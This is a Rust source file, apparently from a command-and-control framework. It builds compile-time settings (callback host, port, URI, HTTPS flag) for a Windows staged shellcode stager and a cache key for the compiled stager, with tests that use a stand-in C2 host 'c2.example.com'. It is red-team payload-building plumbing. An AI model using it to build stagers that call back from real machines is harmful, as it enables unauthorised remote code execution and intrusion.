use super::super::PayloadBuildError;
use super::define_utils::{format_config_bytes, validate_define};
use red_cell_common::ListenerConfig;

/// Build the `-D` defines injected into the staged shellcode stager template.
///
/// Only HTTP listeners are supported: the stager makes an outbound HTTP(S) GET
/// request, which has no equivalent for SMB or DNS listeners.
pub(in super::super) fn build_stager_defines(
    listener: &ListenerConfig,
) -> Result<Vec<String>, PayloadBuildError> {
    let http = match listener {
        ListenerConfig::Http(http) => http,
        _ => {
            return Err(PayloadBuildError::InvalidRequest {
                message: "Windows Shellcode Staged requires an HTTP listener".to_owned(),
            });
        }
    };

    let host = http.hosts.first().ok_or_else(|| PayloadBuildError::InvalidRequest {
        message: "HTTP listener has no configured hosts".to_owned(),
    })?;
    let port = http.port_conn.unwrap_or(http.port_bind);
    let uri = http.uris.first().map(String::as_str).unwrap_or("/");

    // Embed host and URI as C byte-array initialisers so that no shell quoting
    // is needed and the values survive the -D argument intact.
    let host_bytes_with_nul: Vec<u8> = host.bytes().chain(std::iter::once(0u8)).collect();
    let uri_bytes_with_nul: Vec<u8> = uri.bytes().chain(std::iter::once(0u8)).collect();

    let host_define = format!("STAGER_HOST={{{}}}", format_config_bytes(&host_bytes_with_nul));
    let uri_define = format!("STAGER_URI={{{}}}", format_config_bytes(&uri_bytes_with_nul));
    let port_define = format!("STAGER_PORT={port}");
    let secure_define = format!("STAGER_SECURE={}", u8::from(http.secure));

    for define in [&host_define, &uri_define, &port_define, &secure_define] {
        validate_define(define)?;
    }

    Ok(vec![host_define, uri_define, port_define, secure_define])
}

/// Serialise the listener connection parameters into a byte string used as the
/// staged shellcode cache key.
///
/// Only the fields that determine the compiled stager binary are included:
/// host, port, URI, and the HTTPS flag.
pub(in super::super) fn stager_cache_bytes(
    listener: &ListenerConfig,
) -> Result<Vec<u8>, PayloadBuildError> {
    let http = match listener {
        ListenerConfig::Http(http) => http,
        _ => {
            return Err(PayloadBuildError::InvalidRequest {
                message: "Windows Shellcode Staged requires an HTTP listener".to_owned(),
            });
        }
    };

    let host = http.hosts.first().ok_or_else(|| PayloadBuildError::InvalidRequest {
        message: "HTTP listener has no configured hosts".to_owned(),
    })?;
    let port = http.port_conn.unwrap_or(http.port_bind);
    let uri = http.uris.first().map(String::as_str).unwrap_or("/");

    let mut out = Vec::new();
    out.extend_from_slice(host.as_bytes());
    out.push(0);
    out.extend_from_slice(&port.to_le_bytes());
    out.extend_from_slice(uri.as_bytes());
    out.push(0);
    out.push(u8::from(http.secure));
    Ok(out)
}

#[cfg(test)]
mod tests {
    use super::super::define_utils::validate_define;
    use super::*;
    use red_cell_common::{HttpListenerConfig, ListenerConfig};

    #[test]
    fn build_stager_defines_embeds_host_port_uri_and_secure_flag()
    -> Result<(), Box<dyn std::error::Error>> {
        let listener = ListenerConfig::Http(Box::new(HttpListenerConfig {
            name: "http".to_owned(),
            kill_date: None,
            working_hours: None,
            hosts: vec!["c2.example.com".to_owned()],
            host_bind: "0.0.0.0".to_owned(),
            host_rotation: "round-robin".to_owned(),
            port_bind: 80,
            port_conn: Some(443),
            method: None,
            behind_redirector: false,
            trusted_proxy_peers: Vec::new(),
            user_agent: None,
            headers: Vec::new(),
            uris: vec!["/stage1".to_owned()],
            host_header: None,
            secure: true,
            cert: None,
            response: None,
            proxy: None,
            ja3_randomize: None,
            doh_domain: None,
            doh_provider: None,
            legacy_mode: false,
            suppress_opsec_warnings: true,
        }));

        let defines = build_stager_defines(&listener)?;

        // Every define must pass the injection-safety validator.
        for d in &defines {
            validate_define(d)?;
        }
        // STAGER_PORT uses port_conn (443) not port_bind (80).
        assert!(defines.iter().any(|d| d == "STAGER_PORT=443"), "port define missing: {defines:?}");
        // STAGER_SECURE=1 because secure=true.
        assert!(defines.iter().any(|d| d == "STAGER_SECURE=1"), "secure flag missing: {defines:?}");
        // Host bytes for "c2.example.com" must appear in the STAGER_HOST define.
        let host_define = defines
            .iter()
            .find(|d| d.starts_with("STAGER_HOST="))
            .ok_or("STAGER_HOST define missing")?;
        // "c2" starts with 0x63, 0x32 — spot-check first two bytes.
        assert!(host_define.contains("0x63"), "host bytes missing '0x63' (c): {host_define}");
        assert!(host_define.contains("0x32"), "host bytes missing '0x32' (2): {host_define}");
        Ok(())
    }

    #[test]
    fn build_stager_defines_uses_port_bind_when_port_conn_is_none()
    -> Result<(), Box<dyn std::error::Error>> {
        let listener = ListenerConfig::Http(Box::new(HttpListenerConfig {
            name: "http".to_owned(),
            kill_date: None,
            working_hours: None,
            hosts: vec!["host.local".to_owned()],
            host_bind: "0.0.0.0".to_owned(),
            host_rotation: "round-robin".to_owned(),
            port_bind: 8080,
            port_conn: None,
            method: None,
            behind_redirector: false,
            trusted_proxy_peers: Vec::new(),
            user_agent: None,
            headers: Vec::new(),
            uris: Vec::new(),
            host_header: None,
            secure: false,
            cert: None,
            response: None,
            proxy: None,
            ja3_randomize: None,
            doh_domain: None,
            doh_provider: None,
            legacy_mode: false,
            suppress_opsec_warnings: true,
        }));

        let defines = build_stager_defines(&listener)?;
        assert!(defines.iter().any(|d| d == "STAGER_PORT=8080"), "should fall back to port_bind");
        Ok(())
    }

    #[test]
    fn build_stager_defines_uses_default_uri_when_uris_empty()
    -> Result<(), Box<dyn std::error::Error>> {
        let listener = ListenerConfig::Http(Box::new(HttpListenerConfig {
            name: "http".to_owned(),
            kill_date: None,
            working_hours: None,
            hosts: vec!["host.local".to_owned()],
            host_bind: "0.0.0.0".to_owned(),
            host_rotation: "round-robin".to_owned(),
            port_bind: 80,
            port_conn: None,
            method: None,
            behind_redirector: false,
            trusted_proxy_peers: Vec::new(),
            user_agent: None,
            headers: Vec::new(),
            uris: Vec::new(), // empty — should default to "/"
            host_header: None,
            secure: false,
            cert: None,
            response: None,
            proxy: None,
            ja3_randomize: None,
            doh_domain: None,
            doh_provider: None,
            legacy_mode: false,
            suppress_opsec_warnings: true,
        }));

        let defines = build_stager_defines(&listener)?;
        // "/" is 0x2f.
        let uri_define = defines
            .iter()
            .find(|d| d.starts_with("STAGER_URI="))
            .ok_or("STAGER_URI define missing")?;
        assert!(uri_define.contains("0x2f"), "default '/' URI bytes missing: {uri_define}");
        Ok(())
    }

    #[test]
    fn build_stager_defines_rejects_non_http_listener() {
        let listener = ListenerConfig::Smb(red_cell_common::SmbListenerConfig {
            name: "smb".to_owned(),
            pipe_name: "pivot".to_owned(),
            kill_date: None,
            working_hours: None,
        });
        let err = build_stager_defines(&listener)
            .expect_err("non-HTTP listener should be rejected for stager");
        assert!(
            matches!(&err, PayloadBuildError::InvalidRequest { message }
                if message.contains("HTTP listener")),
            "unexpected error: {err}"
        );
    }

    #[test]
    fn stager_cache_bytes_includes_host_port_uri_secure() -> Result<(), Box<dyn std::error::Error>>
    {
        let listener = ListenerConfig::Http(Box::new(HttpListenerConfig {
            name: "http".to_owned(),
            kill_date: None,
            working_hours: None,
            hosts: vec!["c2.local".to_owned()],
            host_bind: "0.0.0.0".to_owned(),
            host_rotation: "round-robin".to_owned(),
            port_bind: 80,
            port_conn: Some(443),
            method: None,
            behind_redirector: false,
            trusted_proxy_peers: Vec::new(),
            user_agent: None,
            headers: Vec::new(),
            uris: vec!["/stage".to_owned()],
            host_header: None,
            secure: true,
            cert: None,
            response: None,
            proxy: None,
            ja3_randomize: None,
            doh_domain: None,
            doh_provider: None,
            legacy_mode: false,
            suppress_opsec_warnings: true,
        }));

        let bytes = stager_cache_bytes(&listener)?;
        // Should contain the host string, null separator, port bytes, uri, null, secure flag.
        assert!(bytes.starts_with(b"c2.local\0"));
        // Port 443 in LE bytes: 0xBB, 0x01
        let port_offset = b"c2.local\0".len();
        assert_eq!(u16::from_le_bytes([bytes[port_offset], bytes[port_offset + 1]]), 443);
        assert!(bytes.ends_with(&[1])); // secure=true
        Ok(())
    }

    #[test]
    fn stager_cache_bytes_rejects_non_http_listener() {
        let listener = ListenerConfig::Smb(red_cell_common::SmbListenerConfig {
            name: "smb".to_owned(),
            pipe_name: "pivot".to_owned(),
            kill_date: None,
            working_hours: None,
        });
        let err = stager_cache_bytes(&listener).expect_err("non-HTTP listener should be rejected");
        assert!(matches!(
            err,
            PayloadBuildError::InvalidRequest { message }
                if message.contains("HTTP listener")
        ));
    }

    #[test]
    fn stager_cache_bytes_differs_when_inputs_differ() -> Result<(), Box<dyn std::error::Error>> {
        let make_listener = |host: &str, port: u16, secure: bool| {
            ListenerConfig::Http(Box::new(HttpListenerConfig {
                name: "http".to_owned(),
                kill_date: None,
                working_hours: None,
                hosts: vec![host.to_owned()],
                host_bind: "0.0.0.0".to_owned(),
                host_rotation: "round-robin".to_owned(),
                port_bind: port,
                port_conn: None,
                method: None,
                behind_redirector: false,
                trusted_proxy_peers: Vec::new(),
                user_agent: None,
                headers: Vec::new(),
                uris: Vec::new(),
                host_header: None,
                secure,
                cert: None,
                response: None,
                proxy: None,
                ja3_randomize: None,
                doh_domain: None,
                doh_provider: None,
                legacy_mode: false,
                suppress_opsec_warnings: true,
            }))
        };

        let a = stager_cache_bytes(&make_listener("host-a", 80, false))?;
        let b = stager_cache_bytes(&make_listener("host-b", 80, false))?;
        let c = stager_cache_bytes(&make_listener("host-a", 8080, false))?;
        let d = stager_cache_bytes(&make_listener("host-a", 80, true))?;

        assert_ne!(a, b, "different hosts must produce different cache bytes");
        assert_ne!(a, c, "different ports must produce different cache bytes");
        assert_ne!(a, d, "different secure flags must produce different cache bytes");
        Ok(())
    }
}
